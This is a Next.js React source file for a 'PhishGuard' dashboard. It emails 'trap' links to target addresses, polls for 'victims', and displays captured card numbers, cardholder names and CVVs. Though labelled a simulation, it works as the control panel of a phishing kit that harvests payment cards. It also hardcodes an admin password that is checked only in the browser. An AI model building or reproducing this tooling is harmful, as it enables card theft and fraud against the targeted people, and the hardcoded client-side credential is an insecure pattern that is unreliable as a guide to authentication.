"use client"
import { useEffect, useState, useRef } from "react"
import { supabase } from "@/lib/supabase"

export default function Dashboard() {
  const [isAuthenticated, setIsAuthenticated] = useState(false)
  const [password, setPassword] = useState("")
  const [targets, setTargets] = useState<any[]>([])
  const [newEmail, setNewEmail] = useState("")
  const lastCompromisedCount = useRef(0)
  const ADMIN_PASSWORD = "Darktraceace221608"

  const playPing = () => {
    const audio = new Audio("https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3")
    audio.play().catch(e => console.log("Audio play blocked until user interaction"))
  }

  const fetchData = async () => {
    const { data } = await supabase.from('targets').select('*').order('created_at', { ascending: false })
    if (data) {
      const currentCompromised = data.filter(t => t.status === 'compromised').length
      // Ping if new person is caught
      if (currentCompromised > lastCompromisedCount.current) {
        playPing()
      }
      lastCompromisedCount.current = currentCompromised
      setTargets(data)
    }
  }

  const addTarget = async (e: React.FormEvent) => {
  e.preventDefault();
  
  // 1. Save to Supabase
  const { error } = await supabase.from('targets').insert([{ email: newEmail }]);
  
  if (!error) {
    // 2. Trigger the Email API
    const trapUrl = `http://localhost:3000/trap?email=${newEmail}`;
    
    try {
      await fetch('/api/send', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email: newEmail, trapUrl }),
      });
      alert("Simulation Launched: Email Sent to Target!");
    } catch (err) {
      console.error("Mail failed:", err);
    }

    setNewEmail("");
    fetchData();
  } else {
    alert("Target already exists or Database error.");
  }
};

  // Auto-refresh every 5 seconds to "listen" for new victims
  useEffect(() => {
    if (isAuthenticated) {
      fetchData()
      const interval = setInterval(fetchData, 5000)
      return () => clearInterval(interval)
    }
  }, [isAuthenticated])

  if (!isAuthenticated) {
    return (
      <div className="min-h-screen bg-slate-900 flex items-center justify-center font-sans">
        <form onSubmit={(e) => { e.preventDefault(); if(password === ADMIN_PASSWORD) setIsAuthenticated(true); else alert("Invalid"); }} className="bg-white p-8 rounded-2xl w-full max-w-sm">
          <h2 className="text-xl font-black mb-4 text-center">ADMIN ACCESS</h2>
          <input type="password" placeholder="Key" className="w-full p-3 border rounded-xl mb-4 text-black" value={password} onChange={(e) => setPassword(e.target.value)} />
          <button className="w-full bg-blue-600 text-white py-3 rounded-xl font-bold">LOGIN</button>
        </form>
      </div>
    )
  }

  return (
    <div className="p-10 bg-slate-50 min-h-screen text-slate-900 font-sans">
      <div className="max-w-6xl mx-auto">
        <header className="flex justify-between items-center mb-10">
          <h1 className="text-3xl font-black text-blue-900 tracking-tighter uppercase italic">PhishGuard Dashboard</h1>
          <div className="flex items-center gap-2 text-[10px] font-bold text-green-500 uppercase">
             <span className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></span>
             Live Monitoring Active
          </div>
        </header>

        <form onSubmit={addTarget} className="mb-10 flex gap-4 bg-white p-4 rounded-2xl border shadow-sm">
          <input type="email" placeholder="target@company.com" className="flex-1 p-3 bg-slate-50 border rounded-xl" value={newEmail} onChange={(e) => setNewEmail(e.target.value)} required />
          <button className="bg-blue-600 text-white px-8 py-3 rounded-xl font-bold uppercase text-xs tracking-widest">Deploy Lure</button>
        </form>

        <div className="bg-white border rounded-2xl overflow-hidden shadow-sm">
          <table className="w-full text-left">
            <thead className="bg-slate-50 border-b text-[10px] font-black text-slate-400 uppercase tracking-widest">
              <tr><th className="px-8 py-4">Employee</th><th className="px-8 py-4">Captured Data</th><th className="px-8 py-4 text-right">Status</th></tr>
            </thead>
            <tbody className="divide-y divide-slate-100">
              {targets.map(t => (
                <tr key={t.id} className="hover:bg-blue-50/30 transition-colors">
                  <td className="px-8 py-5 font-bold text-slate-700">{t.email}</td>
                  <td className="px-8 py-5">
                    {t.status === 'compromised' ? (
                      <div className="text-[10px] bg-red-50 text-red-600 p-3 rounded-xl border border-red-100 font-mono space-y-1 shadow-inner">
                        <p><strong>CARD:</strong> {t.card_number}</p>
                        <p><strong>NAME:</strong> {t.card_name} | <strong>CVV:</strong> {t.cvv}</p>
                      </div>
                    ) : (
                      <span className="text-[10px] text-slate-400 italic font-mono">http://localhost:3000/trap?email={t.email}</span>
                    )}
                  </td>
                  <td className="px-8 py-5 text-right">
                    <span className={`px-4 py-1.5 rounded-full text-[10px] font-black tracking-widest ${t.status === 'compromised' ? 'bg-red-500 text-white animate-pulse' : 'bg-slate-200 text-slate-500'}`}>
                      {t.status.toUpperCase()}
                    </span>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </div>
    </div>
  )
}